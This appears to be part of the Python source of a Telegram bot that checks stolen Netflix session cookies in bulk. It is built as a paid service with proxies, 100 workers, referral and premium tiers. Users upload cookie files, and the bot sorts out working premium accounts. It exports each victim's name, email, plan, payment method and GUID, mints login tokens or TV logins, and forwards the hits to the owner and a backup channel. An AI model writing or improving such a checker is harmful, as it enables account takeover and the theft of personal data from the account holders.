    access, reason, rem = check_access(uid)
    if not access:
        await q.answer(f"⚠️ {reason}", show_alert=True)
        return

    async with user_locks[uid]:
        if user_state.get(uid, {}).get('busy'):
            await q.answer("Already processing!"); return
        modes = {
            "mode_check": ("check", "🔍 Account Check"),
            "mode_nftoken": ("nftoken", "🔑 NF Token"),
            "mode_clean": ("clean", "🧹 Clean"),
            "mode_tvlogin": ("tvlogin", None),
        }
        if data in modes:
            mode, msg = modes[data]
            user_state[uid] = {'mode': mode, 'cookies': [], 'stop': False, 'busy': False}
            if mode == "tvlogin":
                await q.answer("📺 TV mode!")
                await q.message.reply_html(
                    f"<b>📺 TV Login</b>\n\nUse <code>/tv CODE</code>\n\n🍪 Vault: <b>{count_vault_cookies()}</b>")
            else:
                await q.answer(msg)
                await q.message.reply_html(
                    f"<b>{msg}</b>\n\nUpload .txt/.json/.zip file")

async def start_check(update, context):
    q = update.callback_query
    uid = q.from_user.id
    access, reason, rem = check_access(uid)
    if not access:
        await q.answer("⚠️ Denied!", show_alert=True); return
    async with user_locks[uid]:
        cks = user_state.get(uid, {}).get('cookies', [])
        if not cks:
            await q.answer("No cookies!"); return
        if user_state.get(uid, {}).get('busy'):
            await q.answer("Running!"); return
        user_state[uid]['stop'] = False
        user_state[uid]['busy'] = True
        mode = user_state[uid].get('mode', 'check')
        user_tasks[uid] = context.application.create_task(
            process_cookies(q.message.chat_id, cks, uid, context, mode))
    await q.answer(f"Started {len(cks)}!")

async def stop_check(update, context):
    q = update.callback_query
    uid = q.from_user.id
    async with user_locks[uid]:
        if uid in user_tasks:
            user_tasks[uid].cancel()
        if uid in user_state:
            user_state[uid]['busy'] = False
            user_state[uid]['stop'] = True
    await q.answer("Stopped!")

async def get_hits(update, context):
    q = update.callback_query
    uid = q.from_user.id
    hits = user_state.get(uid, {}).get('final_hits') or user_state.get(uid, {}).get('live_hits', OrderedDict())
    if not hits:
        await q.answer("No hits!"); return
    mode = user_state[uid].get('mode', 'check')
    parts = []
    for i, (_, dd) in enumerate(hits.items(), 1):
        parts.append(build_nftoken_str(dd, i) if mode == 'nftoken' else build_export_str(dd, i))
    buf = io.BytesIO(("\n\n".join(parts)).encode())
    await context.bot.send_document(q.message.chat_id,
        document=InputFile(buf, filename=f"hits_{len(hits)}.txt"),
        caption=f"📋 {len(hits)} hits")
    await q.answer("Sent!")

# ============================================================
# FILE UPLOAD
# ============================================================
async def file_upload(update, context):
    if update.effective_chat.type != "private": return
    uid = update.effective_user.id
    joined, missing = await check_force_join(uid, context)
    if not joined:
        await force_join_prompt(update, missing); return
    if is_spamming(uid):
        await update.message.reply_text("⚠️ Too fast!"); return
    access, reason, rem = check_access(uid)
    if not access:
        await update.message.reply_text(f"⚠️ {reason}"); return

    async with user_locks[uid]:
        user_state.setdefault(uid, {'mode': 'check', 'cookies': [], 'stop': False, 'busy': False})
        if user_state[uid].get('busy'):
            await update.message.reply_html("⚠️ Busy.", reply_markup=STOP_MARKUP); return
        mode = user_state[uid].get('mode', 'check')
        fname = update.message.document.file_name or "upload"
        try:
            file = await update.message.document.get_file()
        except Exception as e:
            await update.message.reply_text(f"❌ {e}"); return
        ext = fname.lower()
        with tempfile.TemporaryDirectory() as td:
            tp = os.path.join(td, safe_filename(fname))
            try:
                await file.download_to_drive(tp)
            except Exception as e:
                await update.message.reply_text(f"❌ {e}"); return
            try:
                with open(tp, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
            except Exception:
                content = ""
            if mode == "clean":
                await clean_process(update.effective_chat.id, content, uid, context, fname)
                return
            cookies = []
            if ext.endswith('.zip'):
                cookies = await extract_cookies_from_zip(tp)
            else:
                for idx, (_, cc) in enumerate(parse_cookie_file(content)):
                    if cc.get('NetflixId'):
                        cookies.append((f"{safe_filename(fname)}_{idx}", cc))
            seen, dedup = set(), []
            for nm, ck in cookies:
                h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
                if h not in seen:
                    seen.add(h); dedup.append((nm, ck))
            if not dedup:
                await update.message.reply_text("❌ No valid cookies!"); return
            user_state[uid]['cookies'] = dedup
            mt = {"check": "Account Check", "nftoken": "NFToken"}.get(mode, mode)
            _, _, r2 = check_access(uid)
            li = f"\n🆓 {r2}/{FREE_DAILY_LIMIT} left" if (uid not in ADMIN_IDS and not is_premium(uid) and not is_trial_active(uid)) else ""
            await update.message.reply_html(
                f"✅ <b>{len(dedup)}</b> cookies!\nMode: <b>{mt}</b>{li}\n\nPress below:",
                reply_markup=CHECK_MARKUP)

# ============================================================
# CLEAN MODE
# ============================================================
async def clean_process(chat_id, content, uid, context, fname):
    msg = await context.bot.send_message(chat_id, "🧹 Cleaning...")
    try:
        parsed = parse_cookie_file(content)
        if not parsed:
            await msg.edit_text("❌ No cookies!"); return
        seen, unique = set(), []
        for _, cd in parsed:
            h = hashlib.sha256(json.dumps(cd, sort_keys=True).encode()).hexdigest()
            if h not in seen:
                seen.add(h); unique.append(cd)
        buf = io.BytesIO()
        valid = 0
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            for i, cd in enumerate(unique, 1):
                if cd.get('NetflixId'):
                    valid += 1
                    zf.writestr(f"Cookie_{i}.txt", dict_to_netscape(cd))
        await msg.edit_text(f"✅ {valid} valid of {len(parsed)}")
        if valid:
            buf.seek(0)
            await context.bot.send_document(chat_id,
                document=InputFile(buf, filename=f"Cleaned_{safe_filename(fname)}.zip"),
                caption=f"✅ {valid} valid | {WATERMARK}")
        await msg.delete()
    except Exception as e:
        try: await msg.edit_text(f"❌ {e}")
        except Exception: pass
    finally:
        async with user_locks[uid]:
            user_state.setdefault(uid, {})['busy'] = False

# ============================================================
# PROCESS COOKIES — MULTI-THREAD 100 WORKERS
# ============================================================
async def process_cookies(chat_id, cookies, uid, context, mode):
    checked, hits, fails, free = 0, 0, 0, 0
    total = len(cookies)
    mt = {"check": "🔍 Check", "nftoken": "🔑 Token"}.get(mode, mode)
    hits_tmp_path = tempfile.mktemp(prefix=f"nf_{uid}_")

    try:
        progress = await context.bot.send_message(
            chat_id,
            f"<b>{mt}</b>\n<code>{make_progress_bar(0, total)}</code>\n"
            f"⚡ {MAX_WORKERS} workers | 📦 Batch {BATCH_SIZE}",
            parse_mode='HTML', reply_markup=STOP_MARKUP)
        preview = await context.bot.send_message(chat_id, "<b>Preview...</b>", parse_mode='HTML')
    except Exception as e:
        log.error(f"Init msg: {e}"); return

    live_hits = OrderedDict()
    user_state[uid]['live_hits'] = live_hits
    user_state[uid]['hits_tmp'] = hits_tmp_path
    cf = user_state.get(uid, {}).get('country_filter')

    try:
        with open(hits_tmp_path, "w", encoding='utf-8') as ftmp:
            for bs in range(0, total, BATCH_SIZE):
                if user_state.get(uid, {}).get('stop'): break
                batch = cookies[bs:bs + BATCH_SIZE]
                loop = asyncio.get_running_loop()
                futs = []
                for _, ck in batch:
                    fn = generate_nftoken if mode == 'nftoken' else check_netflix_cookie
                    fut = asyncio.wait_for(loop.run_in_executor(global_executor, fn, ck), timeout=60)
                    futs.append(fut)
                try:
                    results = await asyncio.gather(*futs, return_exceptions=True)
                except asyncio.CancelledError:
                    break
                if user_state.get(uid, {}).get('stop'): break

                for res in results:
                    checked += 1
                    if isinstance(res, Exception):
                        fails += 1; continue
                    if mode == 'nftoken':
                        if isinstance(res, tuple) and len(res) == 2:
                            td, err = res
                            if td:
                                hits += 1
                                live_hits[f"T_{hits}"] = {'token_info': td}
                                if len(live_hits) > MAX_LIVE_HITS:
                                    live_hits.popitem(last=False)
                                ftmp.write(json.dumps({'token': td['token'], 'expires': td['expires']}) + "\n")
                                ftmp.flush()
                            else:
                                fails += 1
                        else:
                            fails += 1
                    else:
                        if not isinstance(res, dict):
                            fails += 1; continue
                        if res.get("ok") and res.get("premium"):
                            if cf and res.get('country', '').upper() not in [c.upper() for c in cf]:
                                free += 1; continue
                            hits += 1
                            live_hits[f"H_{hits}"] = res
                            if len(live_hits) > MAX_LIVE_HITS:
                                live_hits.popitem(last=False)
                            ftmp.write(json.dumps(res, default=str) + "\n")
                            ftmp.flush()
                            save_hit_to_db(uid, mode, res)

                            # ✅ Owner notification
                            if notify_settings.get(str(OWNER_ID), False):
                                try:
                                    await context.bot.send_message(
                                        OWNER_ID,
                                        f"💎 <b>NEW HIT</b>\n"
                                        f"👤 User: <code>{uid}</code>\n"
                                        f"🌍 {res.get('country', 'Unknown')}\n"
                                        f"📦 {res.get('plan', 'Unknown')}")
                                except Exception: pass

                            # ✅ Auto backup
                            if AUTO_BACKUP and BACKUP_CHANNEL:
                                try:
                                    btxt = build_export_str(res, hits)
                                    await context.bot.send_document(
                                        BACKUP_CHANNEL,
                                        document=InputFile(io.BytesIO(btxt.encode()),
                                                          filename=f"hit_{hits}.txt"),
                                        caption=f"🔒 Backup | User: {uid}")
                                except Exception: pass
                        elif res.get("ok"):
                            free += 1
                        else:
                            fails += 1

                bar = make_progress_bar(checked, total)
                nt = (f"<b>{mt}</b>\n<code>{bar}</code>\n✅ {checked}/{total}\n"
                      f"💎 {hits} | 🆓 {free} | ❌ {fails}\n"
                      f"⚡ {MAX_WORKERS} workers")
                try:
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=progress.message_id,
                        text=nt, parse_mode='HTML', reply_markup=STOP_MARKUP)
                except Exception: pass

                if live_hits and mode == 'check':
                    last = list(live_hits.values())[-1]
                    try:
                        prev = (f"<b>Latest Hit (#{hits}):</b>\n<pre>"
                                f"Name: {scrub_text(clean_unicode(last.get('name', '')))}\n"
                                f"Plan: {clean_unicode(last.get('plan', ''))}\n"
                                f"Country: {clean_unicode(last.get('country', ''))}\n"
                                f"Email: {scrub_text(clean_unicode(last.get('email', '')))}\n"
                                f"Quality: {clean_unicode(last.get('video_quality', ''))}\n</pre>")
                        await context.bot.edit_message_text(chat_id=chat_id, message_id=preview.message_id,
                            text=prev, parse_mode='HTML')
                    except Exception: pass
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass
    except Exception as e:
        log.error(f"Process: {e}")
    finally:
        async with user_locks[uid]:
            user_state.setdefault(uid, {})['busy'] = False
            user_state[uid]['stop'] = False
            if uid in user_tasks:
                user_tasks.pop(uid, None)
        consume_usage(uid)
        add_session(uid, mode, checked, hits)

        if hits:
            user_state[uid]['final_hits'] = OrderedDict(live_hits)
            try:
                await context.bot.send_message(chat_id,
                    f"✅ <b>Done!</b>\nChecked: {checked}\n💎 {hits} | 🆓 {free} | ❌ {fails}\n\n<b>Format:</b>",
                    parse_mode='HTML', reply_markup=RESULT_MARKUP)
            except Exception: pass
        else:
            try:
                await context.bot.send_message(chat_id,
                    f"✅ <b>Done!</b>\nChecked: {checked}\n💎 0 | 🆓 {free} | ❌ {fails}",
                    parse_mode='HTML')
            except Exception: pass

# ============================================================
# RESULT SENDERS
# ============================================================
async def send_result_txt(update, context):
    q = update.callback_query
    uid = q.from_user.id
    hits = user_state.get(uid, {}).get('final_hits') or user_state.get(uid, {}).get('live_hits', OrderedDict())
    mode = user_state.get(uid, {}).get('mode', 'check')
    if not hits:
        await q.answer("No results!"); return
    parts = []
    tp = user_state.get(uid, {}).get('hits_tmp')
    if tp and os.path.exists(tp):
        try:
            with open(tp, encoding='utf-8') as f:
                for i, line in enumerate(f, 1):
                    try:
                        data = json.loads(line)
                        if mode == 'nftoken':
                            parts.append(build_nftoken_links_only(data.get('token', ''), data.get('expires', '')))
                        else:
                            parts.append(build_export_str(data, i))
                    except Exception: continue
        except Exception: pass
    if not parts:
        for i, (_, dd) in enumerate(hits.items(), 1):
            parts.append(build_nftoken_str(dd, i) if mode == 'nftoken' else build_export_str(dd, i))
    buf = io.BytesIO(("\n\n".join(parts)).encode())
    fn = "NF_Tokens_Full.txt" if mode == 'nftoken' else "Netflix_Hits.txt"
    await context.bot.send_document(q.message.chat_id, document=InputFile(buf, filename=fn),
                                    caption=f"📄 {len(parts)} results\n{WATERMARK}")
    await q.answer("Sent!")

async def send_result_zip(update, context):
    q = update.callback_query
    uid = q.from_user.id
    hits = user_state.get(uid, {}).get('final_hits') or user_state.get(uid, {}).get('live_hits', OrderedDict())
    mode = user_state.get(uid, {}).get('mode', 'check')
    if not hits:
        await q.answer("No results!"); return
    buf = io.BytesIO()
    tp = user_state.get(uid, {}).get('hits_tmp')
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        if tp and os.path.exists(tp):
            try:
                with open(tp, encoding='utf-8') as f:
                    for i, line in enumerate(f, 1):
                        try:
                            data = json.loads(line)
                            c = build_nftoken_links_only(data.get('token', ''), data.get('expires', '')) if mode == 'nftoken' else build_export_str(data, i)
                            zf.writestr(f"hit_{i}.txt", c)
                        except Exception: continue
            except Exception: pass
        if not zf.namelist():
            for i, (_, dd) in enumerate(hits.items(), 1):
                c = build_nftoken_str(dd, i) if mode == 'nftoken' else build_export_str(dd, i)
                zf.writestr(f"hit_{i}.txt", c)
    buf.seek(0)
    fn = "NF_Tokens.zip" if mode == 'nftoken' else "Netflix_Hits.zip"
    await context.bot.send_document(q.message.chat_id, document=InputFile(buf, filename=fn),
                                    caption=f"📦 All results\n{WATERMARK}")
    await q.answer("Sent!")

async def send_result_csv(update, context):
    q = update.callback_query
    uid = q.from_user.id
    hits = user_state.get(uid, {}).get('final_hits') or user_state.get(uid, {}).get('live_hits', OrderedDict())
    mode = user_state.get(uid, {}).get('mode', 'check')
    if not hits:
        await q.answer("No!"); return
    sio = io.StringIO()
    w = csv.writer(sio)
    if mode == 'check':
        w.writerow(['Name','Email','Country','Plan','Price','Member','NextBill','Payment',
                    'Quality','Streams','Status','Household','GUID'])
        for _, dd in hits.items():
            w.writerow([dd.get('name',''), dd.get('email',''), dd.get('country',''),
                        dd.get('plan',''), dd.get('plan_price',''), dd.get('member_since',''),
                        dd.get('next_billing',''), dd.get('payment_method',''),
                        dd.get('video_quality',''), dd.get('max_streams',''),
                        dd.get('membership_status',''), dd.get('household',''), dd.get('user_guid','')])
    else:
        w.writerow(['Token', 'Expires'])
        for _, dd in hits.items():
            ti = dd.get('token_info', {})
            w.writerow([ti.get('token',''), ti.get('expires','')])
    out = io.BytesIO(sio.getvalue().encode('utf-8-sig'))
    await context.bot.send_document(q.message.chat_id, document=InputFile(out, filename="Netflix_Hits.csv"),
                                    caption=f"📊 CSV\n{WATERMARK}")
    await q.answer("CSV!")

async def send_result_json(update, context):
    q = update.callback_query
    uid = q.from_user.id
    hits = user_state.get(uid, {}).get('final_hits') or user_state.get(uid, {}).get('live_hits', OrderedDict())
    mode = user_state.get(uid, {}).get('mode', 'check')
    if not hits:
        await q.answer("No!"); return
    out_data = []
    for i, (_, dd) in enumerate(hits.items(), 1):
        if mode == 'nftoken':
            ti = dd.get('token_info', {})
            out_data.append({"index": i, "token": ti.get('token',''), "expires": ti.get('expires','')})
        else:
            d = {k: v for k, v in dd.items() if k != 'cookie'}
            out_data.append(d)
    out = io.BytesIO(json.dumps(out_data, indent=2, default=str).encode())
    await context.bot.send_document(q.message.chat_id, document=InputFile(out, filename="Netflix_Hits.json"),
                                    caption=f"📋 JSON\n{WATERMARK}")
    await q.answer("JSON!")

async def send_result_pdf(update, context):
    q = update.callback_query
    uid = q.from_user.id
    hits = user_state.get(uid, {}).get('final_hits') or user_state.get(uid, {}).get('live_hits', OrderedDict())
    if not hits:
        await q.answer("No!"); return
    if PDF_OK:
        buf = io.BytesIO()
        c = pdf_canvas.Canvas(buf, pagesize=letter)
        width, height = letter
        y = height - 50
        c.setFont("Helvetica-Bold", 16)
        c.drawString(50, y, f"Netflix Hits Report ({len(hits)} hits)")
        y -= 20
        c.setFont("Helvetica", 9)
        c.drawString(50, y, f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}")
        y -= 20
        for i, (_, dd) in enumerate(hits.items(), 1):
            if y < 100:
                c.showPage(); y = height - 50
                c.setFont("Helvetica", 9)
            c.setFont("Helvetica-Bold", 10)
            c.drawString(50, y, f"Hit #{i}")
            y -= 13
            c.setFont("Helvetica", 9)
            for k, l in [('name','Name'),('email','Email'),('country','Country'),('plan','Plan'),
                         ('plan_price','Price'),('video_quality','Quality'),
                         ('max_streams','Streams'),('membership_status','Status')]:
                val = str(dd.get(k, 'Unknown'))[:80]
                c.drawString(60, y, f"{l}: {val}")
                y -= 12
            y -= 5
        c.setFont("Helvetica-Oblique", 8)
        c.drawString(50, 30, WATERMARK)
        c.save()
        buf.seek(0)
        await context.bot.send_document(q.message.chat_id,
            document=InputFile(buf, filename="Netflix_Report.pdf"),
            caption=f"📄 PDF Report\n{WATERMARK}")
    else:
        lines = ["NETFLIX HITS REPORT", "="*40, f"Generated: {datetime.now()}", f"Total: {len(hits)}", ""]
        for i, (_, dd) in enumerate(hits.items(), 1):
            lines.append(f"--- Hit #{i} ---")
            for k, l in [('name','Name'),('email','Email'),('country','Country'),('plan','Plan'),
                         ('plan_price','Price'),('video_quality','Quality'),
                         ('max_streams','Streams'),('membership_status','Status')]:
                lines.append(f"{l}: {safe_html(dd.get(k,'Unknown'))}")
            lines.append("")
        lines.append(WATERMARK)
        buf = io.BytesIO("\n".join(lines).encode())
        await context.bot.send_document(q.message.chat_id,
            document=InputFile(buf, filename="Netflix_Report.txt"),
            caption=f"📄 Report\n{WATERMARK}")
    await q.answer("Report!")

# ============================================================
# MAIN
# ============================================================
def main():
    os.makedirs(COOKIES_DIR, exist_ok=True)
    print("=" * 60)
    print(" 🎬 Netflix Bot — ULTRA ENHANCED (25+ Features)")
    print("=" * 60)
    print(f" Vault: {count_vault_cookies()} | Proxies: {len(proxies_list)}")
    print(f" Users: {len(users_data)} | Premium: {len(premium_data)}")
    print(f" Workers: {MAX_WORKERS} | Batch: {BATCH_SIZE}")
    print(f" Force Join: {FORCE_JOIN_CHANNELS}")
    print(f" PDF: {'OK' if PDF_OK else 'NO (pip install reportlab)'}")
    print(f" {WATERMARK}")
    print("=" * 60)

    app = ApplicationBuilder().token(TOKEN).build()

    # User commands
    cmds = [
        ("start", start), ("help", help_command), ("stop", stop_command),
        ("tv", tv_command), ("myplan", myplan_command), ("profile", profile_command),
        ("refer", refer_command), ("myhits", myhits_command), ("search", search_command),
        ("filter", filter_command), ("lang", lang_command), ("daily", daily_command),
        ("leaderboard", leaderboard_command), ("redeem", redeem_command),
        ("buy", buy_command), ("uptime", uptime_command), ("support", support_command),
        ("streak", streak_command), ("watch", watch_command),
        ("watchlist", watchlist_command), ("notify", notify_command),
        ("history", history_command), ("export", export_command),
        ("test", test_command), ("reftop", ref_leaderboard_command),
    ]
    for name, fn in cmds:
        app.add_handler(CommandHandler(name, fn))

    # Admin commands
    admin_cmds = [
        ("admin", admin_command), ("panel", admin_command),
        ("upload", upload_command), ("stats", stats_command),
        ("globalstats", globalstats_command), ("addpremium", addpremium_command),
        ("removepremium", removepremium_command), ("ban", ban_command),
        ("unban", unban_command), ("broadcast", broadcast_command),
        ("vault", vault_command), ("addchannel", addchannel_command),
        ("removechannel", removechannel_command), ("channels", channels_command),
        ("addpromo", addpromo_command), ("delpromo", delpromo_command),
        ("listpromo", listpromo_command), ("audit", audit_command),
        ("tickets", tickets_command), ("impersonate", impersonate_command),
        ("maintenance", maintenance_command), ("proxycheck", proxy_check_command),
        ("cleanup", cleanup_command),
    ]
    for name, fn in admin_cmds:
        app.add_handler(CommandHandler(name, fn))

    # User callbacks
    app.add_handler(CallbackQueryHandler(
        mode_button,
        pattern=r"^(mode_check|mode_nftoken|mode_clean|mode_tvlogin|"
                r"my_profile|my_ref|help_menu|premium_menu|lang_menu|"
                r"support_menu|my_stats|my_streak|my_watch|my_history|"
                r"ref_lb|toggle_notify)$"))
    app.add_handler(CallbackQueryHandler(start_check, pattern=r"^start_check$"))
    app.add_handler(CallbackQueryHandler(stop_check, pattern=r"^stop_check$"))
    app.add_handler(CallbackQueryHandler(get_hits, pattern=r"^get_hits$"))
    app.add_handler(CallbackQueryHandler(send_result_txt, pattern=r"^result_txt$"))
    app.add_handler(CallbackQueryHandler(send_result_zip, pattern=r"^result_zip$"))
    app.add_handler(CallbackQueryHandler(send_result_csv, pattern=r"^result_csv$"))
    app.add_handler(CallbackQueryHandler(send_result_json, pattern=r"^result_json$"))
    app.add_handler(CallbackQueryHandler(send_result_pdf, pattern=r"^result_pdf$"))
    app.add_handler(CallbackQueryHandler(verify_join_callback, pattern=r"^verify_join$"))
    app.add_handler(CallbackQueryHandler(setlang_callback, pattern=r"^setlang_"))

    # Admin panel
    app.add_handler(CallbackQueryHandler(admin_panel, pattern=r"^adm_"))

    # Files
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, file_upload))

    print("🚀 Bot is running...")
    print(f"📢 Force Join: @SkillShareBDCommunity + @BlackoutZoneRBX404")
    print("=" * 60)
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Shutdown")
    except Exception as e:
        log.error(f"Fatal: {e}", exc_info=True)
